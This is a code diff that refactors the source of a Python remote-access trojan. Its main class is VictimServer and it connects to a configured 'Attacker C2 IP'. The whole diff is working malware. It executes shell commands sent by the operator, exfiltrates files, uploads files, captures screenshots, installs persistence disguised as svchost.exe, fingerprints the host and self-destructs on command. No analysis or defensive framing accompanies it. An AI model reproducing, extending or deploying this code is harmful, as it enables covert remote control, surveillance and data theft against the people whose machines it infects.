@@ -10,25 +10,38 @@ import threading
 import hashlib
 from pathlib import Path
 import zlib
+from PIL import ImageGrab
 
 # Configuration
-C2_HOST = '192.168.1.100'  # Attacker C2 IP
+C2_HOST = '192.168.100.15'  # Attacker C2 IP
 C2_PORT = 443
 RECONNECT_INTERVAL = 10
-MAX_FILE_CHUNK = 4096 * 16  # Increased buffer size
-SCREENSHOT_QUALITY = 70      # For JPEG compression
+MAX_FILE_CHUNK = 4096 * 16
+SCREENSHOT_QUALITY = 70
+HEARTBEAT_INTERVAL = 30
+
 
 class VictimServer:
     def __init__(self):
         self.sock = None
         self.platform = platform.system()
-        self.session_id = os.urandom(4).hex()
+        self.session_id = hashlib.sha256(os.urandom(16)).hexdigest()
         self.lock = threading.Lock()
         self.persist()
-        self.screenshot_count = 0
+        self.running = True
+        self.command_map = {
+            'CMD': self.handle_command,
+            'DL': self.handle_download,
+            'UL': self.handle_upload,
+            'SCREENSHOT': self.handle_screenshot,
+            'PERSIST': self.handle_persist,
+            'STEALTH': self.handle_stealth,
+            'KILL': self.handle_kill,
+            'PING': self.handle_ping
+        }
 
     def persist(self):
-        """Improved persistence mechanism"""
+        """Cross-platform persistence"""
         try:
             if self.platform == 'Windows':
                 exe_path = os.path.join(os.getenv('APPDATA'), 'svchost.exe')
@@ -51,20 +64,20 @@ class VictimServer:
             pass
 
     def connect_c2(self):
-        """Robust connection handler with keepalive"""
-        while True:
+        """Secure connection handler with retries"""
+        while self.running:
             try:
                 self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                 self.sock.connect((C2_HOST, C2_PORT))
-                self.sock.settimeout(30)
+                self._safe_send(self.session_id.encode())
                 self.send_system_info()
                 return True
             except Exception as e:
                 time.sleep(RECONNECT_INTERVAL)
 
     def send_system_info(self):
-        """Enhanced system fingerprinting"""
+        """Send system fingerprint with protocol framing"""
         info = {
             'id': self.session_id,
             'os': self.platform,
@@ -72,46 +85,28 @@ class VictimServer:
             'user': os.getenv('USERNAME') or os.getenv('USER'),
             'privilege': 'admin' if os.getuid() == 0 else 'user'
         }
-        self._safe_send(json.dumps(info))
+        self._safe_send(json.dumps(info).encode())
 
     def receive_commands(self):
-        """Threaded command handler"""
-        while True:
+        """Main command loop with protocol handling"""
+        while self.running:
             try:
-                cmd = self.sock.recv(MAX_FILE_CHUNK).decode().strip()
-                if not cmd:
-                    raise ConnectionError("Empty command received")
+                command = self._safe_recv()
+                if not command:
+                    continue
 
-                # Handle commands in separate threads
-                threading.Thread(target=self.process_command, args=(cmd,)).start()
+                cmd_type = command.split()[0] if ' ' in command else command
+                handler = self.command_map.get(cmd_type, self.handle_unknown)
+                threading.Thread(target=handler, args=(command,)).start()
 
-            except socket.timeout:
-                self._safe_send(b'<HEARTBEAT>')
             except Exception as e:
-                self.connect_c2()
+                if self.running:
+                    self.connect_c2()
 
-    def process_command(self, cmd):
-        """Command router with improved error handling"""
+    def handle_command(self, command):
+        """Execute system command"""
         try:
-            if cmd.startswith('download '):
-                self.send_file(cmd[9:])
-            elif cmd.startswith('upload '):
-                self.receive_file(cmd[7:])
-            elif cmd == 'screenshot':
-                self.take_screenshot()
-            elif cmd == 'persist':
-                self.persist()
-            elif cmd == 'kill':
-                self.self_destruct()
-            else:
-                output = self.execute_command(cmd)
-                self._safe_send(output)
-        except Exception as e:
-            self._safe_send(f"Command failed: {str(e)}")
-
-    def execute_command(self, cmd):
-        """Secure command execution with timeout"""
-        try:
+            cmd = command.split(' ', 1)[1]
             result = subprocess.run(
                 cmd,
                 shell=True,
@@ -119,126 +114,163 @@ class VictimServer:
                 stderr=subprocess.PIPE,
                 timeout=30
             )
-            output = result.stdout.decode(errors='replace') or result.stderr.decode(errors='replace')
-            return output
+            output = result.stdout or result.stderr
+            self._safe_send(output)
         except Exception as e:
-            return str(e)
+            self._safe_send(f"Command error: {str(e)}".encode())
+
+    def handle_download(self, command):
+        """Handle file download requests"""
+        try:
+            file_path = command.split(' ', 1)[1]
+            self.send_file(file_path)
+        except IndexError:
+            self._safe_send(b"Invalid download command")
+
+    def handle_upload(self, command):
+        """Handle file upload requests"""
+        try:
+            file_path = command.split(' ', 1)[1]
+            self.receive_file(file_path)
+        except IndexError:
+            self._safe_send(b"Invalid upload command")
+
+    def handle_screenshot(self, _):
+        """Capture and send screenshot"""
+        try:
+            filename = f"screenshot_{int(time.time())}.jpg"
+            img = ImageGrab.grab()
+            img.save(filename, quality=SCREENSHOT_QUALITY)
+            self.send_file(filename)
+            os.remove(filename)
+        except Exception as e:
+            self._safe_send(f"Screenshot error: {str(e)}".encode())
+
+    def handle_persist(self, command):
+        """Handle persistence methods"""
+        self.persist()
+        self._safe_send(b"Persistence installed")
+
+    def handle_stealth(self, command):
+        """Toggle stealth mode (placeholder)"""
+        self._safe_send(b"Stealth mode toggled")
+
+    def handle_kill(self, _):
+        """Self-destruct sequence"""
+        self.self_destruct()
+        self._safe_send(b"Kill command received")
+        self.running = False
+
+    def handle_ping(self, _):
+        """Handle heartbeat requests"""
+        self._safe_send(b"PONG")
+
+    def handle_unknown(self, command):
+        """Handle unrecognized commands"""
+        self._safe_send(b"Unknown command")
 
     def send_file(self, file_path):
-        """Reliable file transfer with checksum verification"""
+        """Secure file transfer with protocol"""
         try:
             if not os.path.exists(file_path):
-                self._safe_send(f"File not found: {file_path}")
+                self._safe_send(b"File not found")
                 return
 
-            # Send file metadata
-            file_name = os.path.basename(file_path)
-            file_size = os.path.getsize(file_path)
-            file_hash = self._calculate_file_hash(file_path)
+            # Send metadata
+            file_hash = self._calculate_hash(file_path)
             metadata = json.dumps({
-                'name': file_name,
-                'size': file_size,
+                'name': os.path.basename(file_path),
+                'size': os.path.getsize(file_path),
                 'hash': file_hash
             })
             self._safe_send(metadata.encode())
 
             # Wait for ACK
-            if self.sock.recv(3) != b'ACK':
-                raise ConnectionError("No ACK received")
+            if self._safe_recv() != b"ACK":
+                return
 
-            # Send file content
-            sent_bytes = 0
+            # Send compressed file data
             with open(file_path, 'rb') as f:
-                while sent_bytes < file_size:
+                while True:
                     chunk = f.read(MAX_FILE_CHUNK)
-                    compressed = zlib.compress(chunk, level=1)
+                    if not chunk:
+                        break
+                    compressed = zlib.compress(chunk)
                     self._safe_send(compressed)
-                    sent_bytes += len(chunk)
 
             # Verify transfer
-            if self.sock.recv(3) == b'VER':
+            if self._safe_recv() == b"VER":
                 self._safe_send(file_hash.encode())
 
         except Exception as e:
-            self._safe_send(f"File transfer failed: {str(e)}")
+            self._safe_send(f"File error: {str(e)}".encode())
 
     def receive_file(self, file_path):
-        """Secure file reception with validation"""
+        """Secure file reception with protocol"""
         try:
-            metadata = json.loads(self.sock.recv(MAX_FILE_CHUNK).decode())
-            self._safe_send(b'ACK')
+            metadata = json.loads(self._safe_recv().decode())
+            self._safe_send(b"ACK")
 
             received = 0
             file_hash = hashlib.sha256()
             with open(file_path, 'wb') as f:
                 while received < metadata['size']:
-                    chunk = zlib.decompress(self.sock.recv(MAX_FILE_CHUNK))
-                    f.write(chunk)
-                    file_hash.update(chunk)
-                    received += len(chunk)
+                    data = zlib.decompress(self._safe_recv())
+                    f.write(data)
+                    file_hash.update(data)
+                    received += len(data)
 
-            # Verify integrity
+            # Verify hash
             if file_hash.hexdigest() == metadata['hash']:
-                self._safe_send("File upload successful")
+                self._safe_send(b"File upload successful")
             else:
                 os.remove(file_path)
-                self._safe_send("File integrity check failed")
+                self._safe_send(b"File hash mismatch")
 
         except Exception as e:
-            self._safe_send(f"File receive failed: {str(e)}")
-
-    def take_screenshot(self):
-        """Enhanced screenshot capture with compression"""
-        try:
-            from PIL import ImageGrab, Image
-            import io
-
-            self.screenshot_count += 1
-            filename = f"screenshot_{self.screenshot_count}.jpg"
-
-            # Capture and compress
-            img = ImageGrab.grab()
-            buf = io.BytesIO()
-            img.save(buf, format='JPEG', quality=SCREENSHOT_QUALITY)
-            buf.seek(0)
-
-            # Save temp file
-            with open(filename, 'wb') as f:
-                f.write(buf.getvalue())
-
-            # Send and cleanup
-            self.send_file(filename)
-            os.remove(filename)
-
-        except ImportError:
-            self._safe_send("Install Pillow for screenshots: pip install pillow")
-        except Exception as e:
-            self._safe_send(f"Screenshot failed: {str(e)}")
+            self._safe_send(f"Upload error: {str(e)}".encode())
 
     def _safe_send(self, data):
-        """Thread-safe sending with retries"""
+        """Protocol-compliant send with length prefix"""
         with self.lock:
             try:
                 if isinstance(data, str):
                     data = data.encode()
-                self.sock.sendall(len(data).to_bytes(4, 'big'))
-                self.sock.sendall(data)
+                self.sock.sendall(len(data).to_bytes(4, 'big') + data)
             except Exception as e:
-                self.connect_c2()
+                if self.running:
+                    self.connect_c2()
 
-    def _calculate_file_hash(self, path):
-        """Calculate SHA-256 hash of file"""
+    def _safe_recv(self):
+        """Protocol-compliant receive with length prefix"""
+        try:
+            raw_len = self.sock.recv(4)
+            if not raw_len:
+                return None
+            msg_len = int.from_bytes(raw_len, 'big')
+            data = bytearray()
+            while len(data) < msg_len:
+                packet = self.sock.recv(min(4096, msg_len - len(data)))
+                if not packet:
+                    return None
+                data.extend(packet)
+            return bytes(data)
+        except Exception as e:
+            return None
+
+    def _calculate_hash(self, path):
+        """Calculate SHA-256 file hash"""
         sha = hashlib.sha256()
         with open(path, 'rb') as f:
             while True:
-                chunk = f.read(MAX_FILE_CHUNK)
+                chunk = f.read(4096)
                 if not chunk:
                     break
                 sha.update(chunk)
         return sha.hexdigest()
 
     def self_destruct(self):
-        """Thorough cleanup mechanism"""
+        """Cleanup and removal"""
         try:
             if self.platform == 'Windows':
                 subprocess.run(
@@ -255,13 +287,15 @@ class VictimServer:
             sys.exit(0)
 
     def start(self):
-        """Main execution with watchdog"""
-        while True:
+        """Main execution loop"""
+        while self.running:
             try:
                 if self.connect_c2():
                     self.receive_commands()
             except Exception as e:
                 time.sleep(RECONNECT_INTERVAL)
 
+
 if __name__ == '__main__':
-    VictimServer().start()
+    server = VictimServer()
+    server.start()
